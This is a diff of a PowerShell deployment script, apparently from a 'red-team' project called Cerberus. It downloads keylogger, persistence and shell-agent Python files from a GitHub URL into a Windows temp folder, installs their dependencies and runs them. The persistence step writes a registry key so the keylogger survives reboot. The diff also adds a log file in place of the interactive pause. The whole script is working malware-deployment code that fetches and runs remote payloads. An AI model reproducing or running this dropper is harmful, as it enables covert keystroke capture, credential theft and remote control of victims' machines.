@@ -2,28 +2,34 @@
 
 $dir = "C:\Windows\Temp\cerberus"
 $base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger"
+$log = "C:\Windows\Temp\cerberus_deploy.log"
+
+"[+] Deploy started $(Get-Date)" | Out-File $log
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
+"[+] Directory created" | Out-File $log -Append
 
-# Download all files
-Invoke-WebRequest -Uri "$base/config.py"       -OutFile "$dir\config.py"
-Invoke-WebRequest -Uri "$base/keylogger.py"    -OutFile "$dir\keylogger.py"
-Invoke-WebRequest -Uri "$base/persistence.py"  -OutFile "$dir\persistence.py"
-Invoke-WebRequest -Uri "$base/shell_agent.py"  -OutFile "$dir\shell_agent.py"
+Invoke-WebRequest -Uri "$base/config.py"        -OutFile "$dir\config.py"
+"[+] config.py downloaded" | Out-File $log -Append
+Invoke-WebRequest -Uri "$base/keylogger.py"     -OutFile "$dir\keylogger.py"
+"[+] keylogger.py downloaded" | Out-File $log -Append
+Invoke-WebRequest -Uri "$base/persistence.py"   -OutFile "$dir\persistence.py"
+"[+] persistence.py downloaded" | Out-File $log -Append
+Invoke-WebRequest -Uri "$base/shell_agent.py"   -OutFile "$dir\shell_agent.py"
+"[+] shell_agent.py downloaded" | Out-File $log -Append
 Invoke-WebRequest -Uri "$base/requirements.txt" -OutFile "$dir\requirements.txt"
+"[+] requirements.txt downloaded" | Out-File $log -Append
 
-# Install all Python dependencies
 pip install -r "$dir\requirements.txt" -q
+"[+] pip install done" | Out-File $log -Append
 
-# Run persistence.py — writes registry key so keylogger survives reboot
 python "$dir\persistence.py"
+"[+] persistence.py ran" | Out-File $log -Append
 
-# Launch shell_agent.py
 Start-Process python -ArgumentList "$dir\shell_agent.py" -WorkingDirectory $dir -WindowStyle Normal
+"[+] shell_agent launched" | Out-File $log -Append
 
-# Launch keylogger.py
 Start-Process python -ArgumentList "$dir\keylogger.py" -WorkingDirectory $dir -WindowStyle Normal
+"[+] keylogger launched" | Out-File $log -Append
 
-# Keep window open so we can read any errors
-Write-Host "`n[+] Deploy complete. Press any key to close..."
-pause
+"[+] Deploy complete $(Get-Date)" | Out-File $log -Append
